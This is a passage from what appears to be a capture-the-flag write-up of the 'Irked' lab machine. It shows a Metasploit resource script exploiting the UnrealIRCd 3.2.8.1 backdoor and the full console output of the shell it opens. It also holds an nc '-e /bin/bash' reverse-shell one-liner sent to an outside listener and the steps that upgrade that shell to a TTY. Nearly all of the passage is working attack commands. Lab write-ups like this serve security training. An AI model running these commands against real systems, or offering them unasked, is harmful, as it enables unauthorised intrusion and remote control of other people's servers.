#### 2.1. Metasploit search
```
msf5 > search unreal_ircd_3281_backdoor

Matching Modules
================

   Name                                        Disclosure Date  Rank       Check  Description
   ----                                        ---------------  ----       -----  -----------
   exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution
```


#### 2.2. Metasploit script setup
```
# cat << EOF > /tmp/rev_TCP.rc
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.10.10.117
set RPORT 6697
set PAYLOAD cmd/unix/reverse
set LHOST 10.10.14.25
set LPORT 4001
exploit
EOF
```


#### 2.3. Reverse shell
```
# msfconsole -qr /tmp/rev_TCP.rc
[*] Processing /tmp/rev_TCP.rc for ERB directives.
resource (/tmp/rev_TCP.rc)> use exploit/unix/irc/unreal_ircd_3281_backdoor
resource (/tmp/rev_TCP.rc)> set RHOSTS 10.10.10.117
RHOSTS => 10.10.10.117
resource (/tmp/rev_TCP.rc)> set RPORT 6697
RPORT => 6697
resource (/tmp/rev_TCP.rc)> set PAYLOAD cmd/unix/reverse
PAYLOAD => cmd/unix/reverse
resource (/tmp/rev_TCP.rc)> set LHOST 10.10.14.25
LHOST => 10.10.14.25
resource (/tmp/rev_TCP.rc)> set LPORT 4001
LPORT => 4001
resource (/tmp/rev_TCP.rc)> exploit
[-] Handler failed to bind to 10.10.14.25:4001:-  -
[*] Started reverse TCP double handler on 0.0.0.0:4001
[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
[*] 10.10.10.117:6697 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo TQTp6wnf28GoJcgl;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "TQTp6wnf28GoJcgl\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (172.17.0.2:4001 -> 10.10.10.117:49805) at 2019-02-09 11:00:22 +0000

id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
/bin/nc 10.10.14.25 9999 -e /bin/bash
```


#### 2.4. TTY shell
```
# ncat -nlvp 9999
Ncat: Version 7.40 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.10.117.
Ncat: Connection from 10.10.10.117:53118.
python -c 'import pty;pty.spawn("/bin/bash")'
ircd@irked:~/Unreal3.2$
ircd@irked:~/Unreal3.2$ ^Z
[10]+  Stopped                 ncat -nlvp 9999
# stty raw -echo
fg
export SHELL=/bin/bash; export TERM=xterm-256color; stty rows 512 columns 256; reset
ircd@irked:~/Unreal3.2$ tty
/dev/pts/0
```
